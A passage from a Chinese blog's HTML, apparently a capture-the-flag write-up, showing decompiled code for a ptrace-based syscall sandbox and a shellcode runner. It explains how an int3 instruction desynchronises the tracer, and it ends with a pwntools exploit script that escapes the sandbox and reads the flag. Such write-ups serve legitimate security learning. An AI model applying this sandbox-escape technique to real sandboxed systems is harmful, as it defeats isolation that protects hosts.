class="number">0</span>) &lt; <span class="number">0</span> )</span><br><span class="line">      sub_1220(<span class="string">&quot;waitpid&quot;</span>);</span><br><span class="line">    alarm(<span class="number">0xF</span>u);</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    ptrace(PTRACE_SETOPTIONS, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)pid, <span class="number">0LL</span>, <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      ptrace(PTRACE_SYSCALL, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)pid, <span class="number">0LL</span>);<span class="comment">// PTRACE_SYSCALL 当子进程进入或者退出系统调用的时候向父进程发送信号, 这里是捕捉进入的信号</span></span><br><span class="line">      <span class="keyword">if</span> ( waitpid(pid, &amp;stat_loc, <span class="number">0x40000000</span>) &lt; <span class="number">0</span> )</span><br><span class="line">        sub_1220(<span class="string">&quot;waitpid&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (stat_loc &amp; <span class="number">0x7F</span>) == <span class="number">0</span> || (<span class="keyword">unsigned</span> __int8)stat_loc == <span class="number">127</span> &amp;&amp; (stat_loc &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span> == <span class="number">11</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ptrace(PTRACE_GETREGS, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)pid, <span class="number">0LL</span>, &amp;reg) &lt; <span class="number">0</span> )<span class="comment">// PTRACE_SETREGS 读取寄存器状态, 存放到reg变量</span></span><br><span class="line">        sub_1220(<span class="string">&quot;ptrace&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (v6 &amp; <span class="number">1</span>) != <span class="number">0</span> )                      <span class="comment">// alarm系统调用之后, 进入系统调用之后rax被设置为0x12341234, 也就是破坏了系统调用, 实现sandbox</span></span><br><span class="line">      &#123;</span><br><span class="line">        reg.orig_rax = <span class="number">0x12341234</span>LL;</span><br><span class="line">        <span class="keyword">if</span> ( ptrace(PTRACE_SETREGS, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)pid, <span class="number">0LL</span>, &amp;reg) &lt; <span class="number">0</span> )</span><br><span class="line">          sub_1220(<span class="string">&quot;ptrace&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( reg.orig_rax == <span class="number">0x25</span> )          <span class="comment">// alarm系统调用</span></span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      ptrace(PTRACE_SYSCALL, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)pid, <span class="number">0LL</span>);<span class="comment">// 捕捉系统调用退出的信号</span></span><br><span class="line">      <span class="keyword">if</span> ( waitpid(pid, &amp;stat_loc, <span class="number">0x40000000</span>) &lt; <span class="number">0</span> )</span><br><span class="line">        sub_1220(<span class="string">&quot;waitpid&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( (stat_loc &amp; <span class="number">0x7F</span>) != <span class="number">0</span> &amp;&amp; ((<span class="keyword">unsigned</span> __int8)stat_loc != <span class="number">127</span> || (stat_loc &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span> != <span class="number">11</span>) );</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="comment">//子进程</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( prctl(<span class="number">1</span>, <span class="number">9LL</span>) &lt; <span class="number">0</span> )</span><br><span class="line">      sub_1220(<span class="string">&quot;prctl(PR_SET_PDEATHSIG)&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( ptrace(PTRACE_TRACEME, <span class="number">0LL</span>, <span class="number">0LL</span>) )     <span class="comment">// 调用PTRACE_TRACEME让父进程开始追踪</span></span><br><span class="line">      sub_1220(<span class="string">&quot;ptrace&quot;</span>);</span><br><span class="line">    v3 = getpid();</span><br><span class="line">    kill(v3, <span class="number">0x13</span>);</span><br><span class="line">    sub_1240();                                 <span class="comment">// 进入了这里</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">127</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_1240</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  buf = mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( buf == (<span class="keyword">void</span> *)<span class="number">-1LL</span> )</span><br><span class="line">    sub_1220(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;how long? &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">4096</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;nope\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, v1) == <span class="number">-1</span> )</span><br><span class="line">    sub_1220(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">  alarm(<span class="number">0xA</span>u);                                  <span class="comment">// 在alarm之后才会限制系统调用</span></span><br><span class="line">  <span class="keyword">return</span> ((__int64 (*)(<span class="keyword">void</span>))buf)();            <span class="comment">// shellcode</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>如果escape sandbox呢, 答案是<code>int3</code>, 指令. </p>
+<p>sandbox代码的流程可以概括如下: </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    ptrace(PTRACE_SYSCALL, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)pid, <span class="number">0LL</span>); <span class="comment">//syscall entry </span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    ptrace(PTRACE_SYSCALL, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)pid, <span class="number">0LL</span>); <span class="comment">//syscall exit </span></span><br><span class="line">&#125;<span class="keyword">while</span></span><br></pre></td></tr></table></figure>
+<p>利用<code>int3</code>指令发送的<code>SIGTRAP</code>信号, 让父进程误以为系统调用已经进入或者退出, 让流程变成下面这样. </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">```c</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    ptrace(PTRACE_SYSCALL, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)pid, <span class="number">0LL</span>); <span class="comment">//syscall exit</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    ptrace(PTRACE_SYSCALL, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)pid, <span class="number">0LL</span>); <span class="comment">//syscall entry</span></span><br><span class="line">&#125;<span class="keyword">while</span></span><br></pre></td></tr></table></figure>
+<p>就可以绕过sandbox, 读出flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span> </span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./sandbox&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;47.93.2.254&#x27;, 21996)</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    int3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode += asm(shellcraft.amd64.cat(<span class="string">&#x27;flag&#x27;</span>), arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x29</span>))</span><br><span class="line">p.send(shellcode)</span><br><span class="line">p.recvall()</span><br></pre></td></tr></table></figure>
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>许可协议</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>接下来阅读</span></section><section class="body fs14"><a id="next" href="/xxy1126.github.io/2022/04/24/CVE-2020-3331%E5%88%86%E6%9E%90/">CVE-2020-3331分析<span class="note">较早</span></a><div class="line"></div></section></div>
+
+
+
+
+
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+<p>本站由 <a href="https://www.tmotfl.top/xxy1126.github.io/">@1m0tfl</a> 创建，使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1" title="v1.6.1">Stellar</a> 作为主题。</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1';
+  stellar.config = {
+    date_suffix: {
+      just: '刚刚',
+      min: '分钟前',
+      hour: '小时前',
+      day: '天前',
+      month: '个月前',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/xxy1126.github.io/js/plugins/sites.js',
+    friendsjs: '/xxy1126.github.io/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/xxy1126.github.io/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
